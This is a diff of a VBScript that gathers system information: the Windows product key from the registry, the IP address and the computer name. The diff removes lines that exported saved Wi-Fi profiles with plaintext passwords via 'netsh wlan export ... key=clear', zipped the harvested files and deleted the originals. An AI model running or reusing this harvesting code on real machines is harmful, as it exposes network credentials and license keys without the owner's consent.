@@ -1,10 +1,4 @@
-' Export SSID Profiles
-Set oShell = WScript.CreateObject("WScript.Shell")
-oShell.run "cmd /k netsh wlan export profile folder=. key=clear & exit"
-
-Set oShell = Nothing
-
-' Windows Activation Keys
+' WIN KEYS
 Dim iVl()
 Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
 oReg.GetBinaryValue &H80000002,"SOFTWARE\Microsoft\Windows NT\CurrentVersion","DigitalProductId",iVl
@@ -47,7 +41,7 @@ KO.WriteLine(strOS & ", " & spk)
 
 Set fso = Nothing
 
-' IP Address
+' IP ADDRESS
 dim NIC1, Nic, StrIP, CompName
 Set NIC1 = GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
 
@@ -89,20 +83,6 @@ For Each Nic in NIC1
     KO.WriteLine("computerName=" & CompName)
 
     Set fso = Nothing
-	
-    ' Create Zip Name
-    DateArr = Split(Date(), "/")
-
-    FullDate = DateArr(2) & DateArr(1) & DateArr(0)
-    FullTime = Replace(Time(), ":", "")
-
-    ZipName = CompName & "_" & FullDate & "_" & FullTime & ".zip"
-	
-	  ' Compress Files
-    Set oShell = WScript.CreateObject("WScript.Shell")
-    oShell.run "cmd /k powershell Compress-Archive -U -Path .\Wi-Fi*.xml, keys.csv, ip.prop -DestinationPath " & ZipName & "; rm .\Wi-Fi*.xml, keys.csv, ip.prop & exit"
-
-    Set oShell = Nothing
     wscript.quit
   End if
 Next
